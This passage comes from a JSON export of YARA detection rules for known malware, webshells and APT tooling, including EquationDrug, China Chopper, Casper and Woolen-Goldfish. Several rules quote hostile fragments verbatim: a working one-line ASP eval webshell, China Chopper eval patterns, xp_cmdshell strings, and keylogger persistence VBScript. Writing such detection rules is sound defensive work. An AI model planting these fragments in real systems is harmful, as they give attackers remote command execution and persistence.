= 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Connect to %s MSSQL server success. Type Command at Prompt.\" fullword ascii\n      $s11 = \";DATABASE=master\" fullword ascii\n      $s12 = \"xp_cmdshell '\" fullword ascii\n      $s14 = \"SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=Yes;Data Source=myserver\" ascii\n   condition: \n      all of them\n}","date":"2015-03-30 12:55:51","description":"Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe","minimum_yara":"1.7","name":"CN_Toolset_sig_1433_135_sqlr_RID30D0","reference":"http://qiannao.com/ls/905300366/33834c0c/","required_modules":[],"rule_hash":"196fdd5c3f2190e74b80abb73fc5c9a5","score":70,"tags":["DEMO","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule WoolenGoldfish_Sample_1_RID3006 : APT DEMO {\n   meta:\n      description = \"Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/NpJpVZ\"\n      date = \"2015-03-25 12:22:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Cannot execute (%d)\" fullword ascii\n      $s16 = \"SvcName\" fullword ascii\n   condition: \n      all of them\n}","date":"2015-03-25 12:22:11","description":"Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ","minimum_yara":"1.7","name":"WoolenGoldfish_Sample_1_RID3006","reference":"http://goo.gl/NpJpVZ","required_modules":[],"rule_hash":"2e2435291d817a44efd22e532d202b8c","score":60,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule WoolenGoldfish_Generic_2_RID3062 : APT DEMO GEN {\n   meta:\n      description = \"Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/NpJpVZ\"\n      date = \"2015-03-25 12:37:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"modules\\\\exploits\\\\littletools\\\\agent_wrapper\\\\release\" ascii\n   condition: \n      all of them\n}","date":"2015-03-25 12:37:31","description":"Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ","minimum_yara":"1.7","name":"WoolenGoldfish_Generic_2_RID3062","reference":"http://goo.gl/NpJpVZ","required_modules":[],"rule_hash":"ca2f74641174924e9780e0a9dbb9e472","score":90,"tags":["APT","DEMO","GEN"]},{"author":"Florian Roth","content":"rule WoolenGoldfish_Generic_1_RID3061 : APT DEMO GEN {\n   meta:\n      description = \"Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/NpJpVZ\"\n      date = \"2015-03-25 12:37:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x0 = \"Users\\\\Wool3n.H4t\\\\\" \n      $x1 = \"C-CPP\\\\CWoolger\" \n      $x2 = \"NTSuser.exe\" fullword wide\n      $s1 = \"107.6.181.116\" fullword wide\n      $s2 = \"oShellLink.Hotkey = \\\"CTRL+SHIFT+F\\\"\" fullword\n      $s3 = \"set WshShell = WScript.CreateObject(\\\"WScript.Shell\\\")\" fullword\n      $s4 = \"oShellLink.IconLocation = \\\"notepad.exe, 0\\\"\" fullword\n      $s5 = \"set oShellLink = WshShell.CreateShortcut(strSTUP & \\\"\\\\WinDefender.lnk\\\")\" fullword\n      $s6 = \"wlg.dat\" fullword\n      $s7 = \"woolger\" fullword wide\n      $s8 = \"[Enter]\" fullword\n      $s9 = \"[Control]\" fullword\n   condition: \n      ( 1 of ( $x* ) and 2 of ( $s* ) ) or ( 6 of ( $s* ) )\n}","date":"2015-03-25 12:37:21","description":"Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ","minimum_yara":"1.7","name":"WoolenGoldfish_Generic_1_RID3061","reference":"http://goo.gl/NpJpVZ","required_modules":[],"rule_hash":"74d1b02f71a242892c438474ca9b1889","score":90,"tags":["APT","DEMO","GEN"]},{"author":"Florian Roth","content":"rule Webshell_CN_Hacktools_tools_asp_RID3371 : CHINA DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Archive - file asp.asp\"\n      author = \"Florian Roth\"\n      reference = \"xfocus.net\"\n      date = \"2015-03-22 14:48:01\"\n      score = 55\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>\" fullword ascii\n   condition: \n      all of them\n}","date":"2015-03-22 14:48:01","description":"Chinese Hacktool Archive - file asp.asp","minimum_yara":"1.7","name":"Webshell_CN_Hacktools_tools_asp_RID3371","reference":"xfocus.net","required_modules":[],"rule_hash":"da4367606fc0395ce48eaedac0d40023","score":55,"tags":["T1100","DEMO","WEBSHELL","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule EquationDrug_HDDSSD_Op_RID2F20 : APT DEMO {\n   meta:\n      description = \"EquationDrug - HDD/SSD firmware operation - nls_933w.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 11:43:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"nls_933w.dll\" fullword ascii\n   condition: \n      all of them\n}","date":"2015-03-11 11:43:51","description":"EquationDrug - HDD/SSD firmware operation - nls_933w.dll","minimum_yara":"1.7","name":"EquationDrug_HDDSSD_Op_RID2F20","reference":"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/","required_modules":[],"rule_hash":"2f6e053968f1d642ec8bdcf441291447","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule EquationDrug_NetworkSniffer1_RID3230 : APT DEMO MAL T1040 {\n   meta:\n      description = \"EquationDrug - Backdoor driven by network sniffer - mstcp32.sys, fat32.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 13:54:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n      $s1 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n      $s3 = \"sys\\\\mstcp32.dbg\" fullword ascii\n      $s7 = \"mstcp32.sys\" fullword wide\n      $s8 = \"p32.sys\" fullword ascii\n      $s9 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n      $s10 = \"\\\\DosDevices\\\\%ws\" fullword wide\n      $s11 = \"\\\\Device\\\\%ws\" fullword wide\n   condition: \n      all of them\n}","date":"2015-03-11 13:54:31","description":"EquationDrug - Backdoor driven by network sniffer - mstcp32.sys, fat32.sys","minimum_yara":"1.7","name":"EquationDrug_NetworkSniffer1_RID3230","reference":"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/","required_modules":[],"rule_hash":"09dcb2349f45ec5e1aa3cadb2845e0d3","score":75,"tags":["APT","DEMO","T1040","MAL"]},{"author":"Florian Roth","content":"rule EquationDrug_NetworkSniffer2_RID3231 : APT DEMO T1040 {\n   meta:\n      description = \"EquationDrug - Network Sniffer - tdip.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 13:54:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n      $s1 = \"IP Transport Driver\" fullword wide\n      $s2 = \"tdip.sys\" fullword wide\n      $s3 = \"sys\\\\tdip.dbg\" fullword ascii\n      $s4 = \"dip.sys\" fullword ascii\n      $s5 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n      $s6 = \"\\\\DosDevices\\\\%ws\" fullword wide\n      $s7 = \"\\\\Device\\\\%ws\" fullword wide\n   condition: \n      all of them\n}","date":"2015-03-11 13:54:41","description":"EquationDrug - Network Sniffer - tdip.sys","minimum_yara":"1.7","name":"EquationDrug_NetworkSniffer2_RID3231","reference":"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/","required_modules":[],"rule_hash":"3f47605d50cca76d93730327968796e9","score":75,"tags":["APT","DEMO","T1040"]},{"author":"Florian Roth","content":"rule EquationDrug_NetworkSniffer3_RID3232 : APT DEMO T1040 {\n   meta:\n      description = \"EquationDrug - Network Sniffer - tdip.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 13:54:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Corporation. All rights reserved.\" fullword wide\n      $s1 = \"IP Transport Driver\" fullword wide\n      $s2 = \"tdip.sys\" fullword wide\n      $s3 = \"tdip.pdb\" fullword ascii\n   condition: \n      all of them\n}","date":"2015-03-11 13:54:51","description":"EquationDrug - Network Sniffer - tdip.sys","minimum_yara":"1.7","name":"EquationDrug_NetworkSniffer3_RID3232","reference":"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/","required_modules":[],"rule_hash":"5ff2e2254e4155db6fcdd02677908ac7","score":75,"tags":["APT","DEMO","T1040"]},{"author":"Florian Roth","content":"rule EquationDrug_VolRec_Driver_RID315E : APT DEMO {\n   meta:\n      description = \"EquationDrug - Collector plugin for Volrec - msrstd.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 13:19:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"msrstd.sys\" fullword wide\n      $s1 = \"msrstd.pdb\" fullword ascii\n      $s2 = \"msrstd driver\" fullword wide\n   condition: \n      all of them\n}","date":"2015-03-11 13:19:31","description":"EquationDrug - Collector plugin for Volrec - msrstd.sys","minimum_yara":"1.7","name":"EquationDrug_VolRec_Driver_RID315E","reference":"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/","required_modules":[],"rule_hash":"a52c43e7944ba250156d1a528de74076","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule EquationDrug_KernelRootkit_RID3195 : APT DEMO T1014 T1050 {\n   meta:\n      description = \"EquationDrug - Kernel mode stage 0 and rootkit (Windows 2000 and above) - msndsrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 13:28:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1014, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n      $s1 = \"Parmsndsrv.dbg\" fullword ascii\n      $s2 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n      $s3 = \"msndsrv.sys\" fullword wide\n      $s5 = \"\\\\REGISTRY\\\\MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Windows\" fullword wide\n      $s6 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n      $s7 = \"\\\\DosDevices\\\\%ws\" fullword wide\n      $s9 = \"\\\\Device\\\\%ws\" fullword wide\n   condition: \n      all of them\n}","date":"2015-03-11 13:28:41","description":"EquationDrug - Kernel mode stage 0 and rootkit (Windows 2000 and above) - msndsrv.sys","minimum_yara":"1.7","name":"EquationDrug_KernelRootkit_RID3195","reference":"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/","required_modules":[],"rule_hash":"eda83e9d7d20428eb0a51853d49147ae","score":75,"tags":["APT","DEMO","T1014","T1050"]},{"author":"Florian Roth","content":"rule EquationDrug_Keylogger_RID2FF1 : APT DEMO HKTL T1056 {\n   meta:\n      description = \"EquationDrug - Key/clipboard logger driver - msrtvd.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 12:18:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL, T1056\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\registry\\\\machine\\\\software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\" fullword wide\n      $s2 = \"\\\\registry\\\\machine\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Session Manager\\\\En\" wide\n      $s3 = \"\\\\DosDevices\\\\Gk\" fullword wide\n      $s5 = \"\\\\Device\\\\Gk0\" fullword wide\n   condition: \n      all of them\n}","date":"2015-03-11 12:18:41","description":"EquationDrug - Key/clipboard logger driver - msrtvd.sys","minimum_yara":"1.7","name":"EquationDrug_Keylogger_RID2FF1","reference":"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/","required_modules":[],"rule_hash":"b0c56a123c4650117bcc4b65ae889a3c","score":75,"tags":["APT","DEMO","T1056","HKTL"]},{"author":"Florian Roth","content":"rule EquationDrug_NetworkSniffer4_RID3233 : APT DEMO T1040 {\n   meta:\n      description = \"EquationDrug - Network-sniffer/patcher - atmdkdrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 13:55:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Copyright 1999 RAVISENT Technologies Inc.\" fullword wide\n      $s1 = \"\\\\systemroot\\\\\" fullword ascii\n      $s2 = \"RAVISENT Technologies Inc.\" fullword wide\n      $s3 = \"Created by VIONA Development\" fullword wide\n      $s4 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n      $s5 = \"\\\\device\\\\harddiskvolume\" fullword wide\n      $s7 = \"ATMDKDRV.SYS\" fullword wide\n      $s8 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n      $s9 = \"\\\\DosDevices\\\\%ws\" fullword wide\n      $s10 = \"CineMaster C 1.1 WDM Main Driver\" fullword wide\n      $s11 = \"\\\\Device\\\\%ws\" fullword wide\n      $s13 = \"CineMaster C 1.1 WDM\" fullword wide\n   condition: \n      all of them\n}","date":"2015-03-11 13:55:01","description":"EquationDrug - Network-sniffer/patcher - atmdkdrv.sys","minimum_yara":"1.7","name":"EquationDrug_NetworkSniffer4_RID3233","reference":"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/","required_modules":[],"rule_hash":"fb864fba90d20a6c97e5205c0146057f","score":75,"tags":["APT","DEMO","T1040"]},{"author":"Florian Roth","content":"rule EquationDrug_PlatformOrchestrator_RID348D : APT DEMO {\n   meta:\n      description = \"EquationDrug - Platform orchestrator - mscfg32.dll, svchost32.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 15:35:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"SERVICES.EXE\" fullword wide\n      $s1 = \"\\\\command.com\" fullword wide\n      $s2 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n      $s3 = \"LSASS.EXE\" fullword wide\n      $s4 = \"Windows Configuration Services\" fullword wide\n      $s8 = \"unilay.dll\" fullword ascii\n   condition: \n      all of them\n}","date":"2015-03-11 15:35:21","description":"EquationDrug - Platform orchestrator - mscfg32.dll, svchost32.dll","minimum_yara":"1.7","name":"EquationDrug_PlatformOrchestrator_RID348D","reference":"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/","required_modules":[],"rule_hash":"c9e3fcd3b3b24b26ba202b14f87255de","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule EquationDrug_NetworkSniffer5_RID3234 : APT DEMO T1040 {\n   meta:\n      description = \"EquationDrug - Network-sniffer/patcher - atmdkdrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 13:55:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n      $s1 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n      $s2 = \"atmdkdrv.sys\" fullword wide\n      $s4 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n      $s5 = \"\\\\DosDevices\\\\%ws\" fullword wide\n      $s6 = \"\\\\Device\\\\%ws\" fullword wide\n   condition: \n      all of them\n}","date":"2015-03-11 13:55:11","description":"EquationDrug - Network-sniffer/patcher - atmdkdrv.sys","minimum_yara":"1.7","name":"EquationDrug_NetworkSniffer5_RID3234","reference":"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/","required_modules":[],"rule_hash":"f3d11e1af4163400843245049cb821df","score":75,"tags":["APT","DEMO","T1040"]},{"author":"Florian Roth","content":"rule EquationDrug_FileSystem_Filter_RID3312 : APT DEMO {\n   meta:\n      description = \"EquationDrug - Filesystem filter driver volrec.sys, scsi2mgr.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 14:32:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"volrec.sys\" fullword wide\n      $s1 = \"volrec.pdb\" fullword ascii\n      $s2 = \"Volume recognizer driver\" fullword wide\n   condition: \n      all of them\n}","date":"2015-03-11 14:32:11","description":"EquationDrug - Filesystem filter driver volrec.sys, scsi2mgr.sys","minimum_yara":"1.7","name":"EquationDrug_FileSystem_Filter_RID3312","reference":"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/","required_modules":[],"rule_hash":"2327fdf9194211c00430eefbe163583b","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule ChinaChopper_Generic_RID2EE1 : CHINA DEMO GEN T1100 WEBSHELL {\n   meta:\n      description = \"China Chopper Webshells - PHP and ASPX\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/content/dam/legacy/resources/pdfs/fireeye-china-chopper-report.pdf\"\n      date = \"2015-03-10 11:33:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, GEN, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $aspx = /%@\\sPage\\sLanguage=.Jscript.%><%eval\\(RequestItem\\[.{,100}unsafe/ \n      $php = /<?php.\\@eval\\(\\$_POST./ \n   condition: \n      1 of them\n}","date":"2015-03-10 11:33:21","description":"China Chopper Webshells - PHP and ASPX","minimum_yara":"1.7","name":"ChinaChopper_Generic_RID2EE1","reference":"https://www.fireeye.com/content/dam/legacy/resources/pdfs/fireeye-china-chopper-report.pdf","required_modules":[],"rule_hash":"4bb7e96a7be18d17ddcfe1c0f6298010","score":75,"tags":["T1100","DEMO","WEBSHELL","CHINA","GEN"]},{"author":"Florian Roth","content":"rule Casper_Included_Strings_RID303F : APT DEMO EXE FILE MAL T1082 {\n   meta:\n      description = \"Casper French Espionage Malware - String Match in File - http://goo.gl/VRJNLo\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/VRJNLo\"\n      date = \"2015-03-06 12:31:41\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1082\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a0 = \"cmd.exe /C FOR /L %%i IN (1,1,%d) DO IF EXIST\" \n      $a1 = \"& SYSTEMINFO) ELSE EXIT\" \n      $c1 = \"domcommon.exe\" wide fullword\n      $c2 = \"jpic.gov.sy\" fullword\n      $c3 = \"aiomgr.exe\" wide fullword\n      $c4 = \"perfaudio.dat\" fullword\n      $c5 = \"Casper_DLL.dll\" fullword\n      $c6 = { 7B 4B 59 DE 37 4A 42 26 59 98 63 C6 2D 0F 57 40 } \n      $c7 = \"{4216567A-4512-9825-7745F856}\" fullword\n   condition: \n      all of ( $a* ) or ( uint16 ( 0 ) == 0x5a4d and 1 of ( $c* ) )\n}","date":"2015-03-06 12:31:41","description":"Casper French Espionage Malware - String Match in File - http://goo.gl/VRJNLo","minimum_yara":"1.7","name":"Casper_Included_Strings_RID303F","reference":"http://goo.gl/VRJNLo","required_modules":[],"rule_hash":"508b869f2e152518fb5d439b8a4b20a2","score":50,"tags":["MAL","DEMO","FILE","APT","T1082","EXE"]},{"author":"Florian Roth","content":"rule Casper_SystemInformation_Output_RID33C9 : APT DEMO MAL {\n   meta:\n      description = \"Casper French Espionage Malware - System Info Output - http://goo.gl/VRJNLo\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/VRJNLo\"\n      date = \"2015-03-06 15:02:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a0 = \"***** SYSTEM INFORMATION ******\" \n      $a1 = \"***** SECURITY INFORMATION ******\" \n      $a2 = \"Antivirus: \" \n      $a3 = \"Firewall: \" \n      $a4 = \"***** EXECUTION CONTEXT ******\" \n      $a5 = \"Identity: \" \n      $a6 = \"<CONFIG TIMESTAMP=\" \n   condition: \n      all of them\n}","date":"2015-03-06 15:02:41","description":"Casper French Espionage Malware - System Info Output - http://goo.gl/VRJNLo","minimum_yara":"1.7","name":"Casper_SystemInformation_Output_RID33C9","reference":"http://goo.gl/VRJNLo","required_modules":[],"rule_hash":"fc27fd8f4cc505734516241907b065b2","score":70,"tags":["APT","DEMO","MAL"]},{"author":"Florian Roth","content":"rule Casper_Backdoor_x86_RID2E38 : APT DEMO HKTL MAL T1090 {\n   meta:\n      description = \"Casper French Espionage Malware - Win32/ProxyBot.B - x86 Payload http://goo.gl/VRJNLo\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/VRJNLo\"\n      date = \"2015-03-05 11:05:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL, MAL, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\"svchost.exe\\\"\" fullword wide\n      $s2 = \"firefox.exe\" fullword ascii\n      $s3 = \"\\\"Host Process for Windows Services\\\"\" fullword wide\n      $x1 = \"\\\\Users\\\\*\" fullword ascii\n      $x2 = \"\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\*\" fullword ascii\n      $x3 = \"\\\\Mozilla\\\\Firefox\\\\Profiles\\\\*\" fullword ascii\n      $x4 = \"\\\\Documents and Settings\\\\*\" fullword ascii\n      $y1 = \"%s; %S=%S\" fullword wide\n      $y2 = \"%s; %s=%s\" fullword ascii\n      $y3 = \"Cookie: %s=%s\" fullword ascii\n      $y4 = \"http://%S:%d\" fullword wide\n      $z1 = \"http://google.com/\" fullword ascii\n      $z2 = \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MALC)\" fullword ascii\n      $z3 = \"Operating System\\\"\" fullword wide\n   condition: \n      ( all of ( $s* ) ) or ( 3 of ( $x* ) and 2 of ( $y* ) and 2 of ( $z* ) )\n}","date":"2015-03-05 11:05:11","description":"Casper French Espionage Malware - Win32/ProxyBot.B - x86 Payload http://goo.gl/VRJNLo","minimum_yara":"1.7","name":"Casper_Backdoor_x86_RID2E38","reference":"http://goo.gl/VRJNLo","required_modules":[],"rule_hash":"a63c3d2858b183e62c352efb0660bd52","score":80,"tags":["APT","T1090","DEMO","HKTL","MAL"]},{"author":"Florian Roth","content":"rule Casper_EXE_Dropper_RID2DEB : APT DEMO HKTL MAL T1090 {\n   meta:\n      description = \"Casper French Espionage Malware - Win32/ProxyBot.B - Dropper http://goo.gl/VRJNLo\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/VRJNLo\"\n      date = \"2015-03-05 10:52:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL, MAL, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<Command>\" fullword ascii\n      $s1 = \"</Command>\" fullword ascii\n      $s2 = \"\\\" /d \\\"\" fullword ascii\n      $s4 = \"'%s' %s\" fullword ascii\n      $s5 = \"nKERNEL32.DLL\" fullword wide\n      $s6 = \"@ReturnValue\" fullword wide\n      $s7 = \"ID: 0x%x\" fullword ascii\n      $s8 = \"Name: %S\" fullword ascii\n   condition: \n      7 of them\n}","date":"2015-03-05 10:52:21","description":"Casper French Espionage Malware - Win32/ProxyBot.B - Dropper http://goo.gl/VRJNLo","minimum_yara":"1.7","name":"Casper_EXE_Dropper_RID2DEB","reference":"http://goo.gl/VRJNLo","required_modules":[],"rule_hash":"c36beb35fb4dfd49b45fa1036763409f","score":80,"tags":["APT","T1090","DEMO","HKTL","MAL"]},{"author":"Florian Roth","content":"rule Equation_Kaspersky_GreyFishInstaller_RID35A1 : APT DEMO MAL {\n   meta:\n      description = \"Equation Group Malware - Grey Fish\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/ivt8EW\"\n      date = \"2015-02-16 16:21:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"DOGROUND.exe\" fullword wide\n      $s1 = \"Windows Configuration Services\" fullword wide\n      $s2 = \"GetMappedFilenameW\" fullword ascii\n   condition: \n      all of them\n}","date":"2015-02-16 16:21:21","description":"Equation Group Malware - Grey Fish","minimum_yara":"1.7","name":"Equation_Kaspersky_GreyFishInstaller_RID35A1","reference":"http://goo.gl/ivt8EW","required_modules":[],"rule_hash":"86c4b085e4572dfba4d82c3ef5ee894b","score":80,"tags":["APT","DEMO","MAL"]},{"author":"Florian Roth","content":"rule Dexter_Malware_RID2CA5 : DEMO MAL {\n   meta:\n      description = \"Detects the Dexter Trojan/Agent http://goo.gl/oBvy8b\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/oBvy8b\"\n      date = \"2015-02-10 09:58:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Java Security Plugin\" fullword wide\n      $s1 = \"%s\\\\%s\\\\%s.exe\" fullword wide\n      $s2 = \"Sun Java Security Plugin\" fullword wide\n      $s3 = \"\\\\Internet Explorer\\\\iexplore.exe\" fullword wide\n   condition: \n      all of them\n}","date":"2015-02-10 09:58:01","description":"Detects the Dexter Trojan/Agent http://goo.gl/oBvy8b","minimum_yara":"1.7","name":"Dexter_Malware_RID2CA5","reference":"http://goo.gl/oBvy8b","required_modules":[],"rule_hash":"d2dfa50d329079da20d64cdf9e7201be","score":70,"tags":["DEMO","MAL"]},{"author":"Florian Roth","content":"rule Enfal_Malware_RID2C1F : DEMO MAL {\n   meta:\n      description = \"Detects a certain type of Enfal Malware\"\n      author = \"Florian Roth\"\n      reference = \"not 